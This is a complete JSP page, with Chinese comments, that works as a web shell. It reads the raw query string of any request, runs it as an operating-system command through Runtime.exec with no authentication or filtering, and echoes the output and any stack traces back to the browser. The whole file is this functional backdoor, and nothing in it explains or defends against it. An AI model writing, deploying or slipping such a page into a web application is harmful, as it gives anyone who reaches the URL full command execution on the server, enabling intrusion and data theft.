<%@page import="java.util.Properties"%>
<%@page import="java.util.Hashtable"%>
<%@ page import="java.io.*"%>
<%@ page language="java" contentType="text/html; charset=utf-8"
	session="false" pageEncoding="utf-8"%>
<%
	Properties props = System.getProperties();//获取系统属性
	// props.list(System.out);
	String coding = (String) props.getProperty("sun.jnu.encoding");
	String cmd = request.getQueryString();
	//  cmd = cmd == null ? "ping 127.0.0.1" : cmd.replaceAll("%20"," ");
	try {
		if (cmd != null) {
			Process p = Runtime.getRuntime().exec(cmd);//注意Runtime对象的创建
			String line;
			BufferedReader buf = new BufferedReader(
					new InputStreamReader(p.getInputStream(), coding));
			while ((line = buf.readLine()) != null) {
				//System.out.println(line);
				out.print(line);
				out.print("<br/>");
			}
		}
	} catch (Exception e) {
		/* StringWriter sw = new StringWriter();
		PrintWriter pw = new PrintWriter(sw);
		e.printStackTrace(pw);
		out.print(sw); */
		e.printStackTrace(new PrintWriter(out));
	}
%>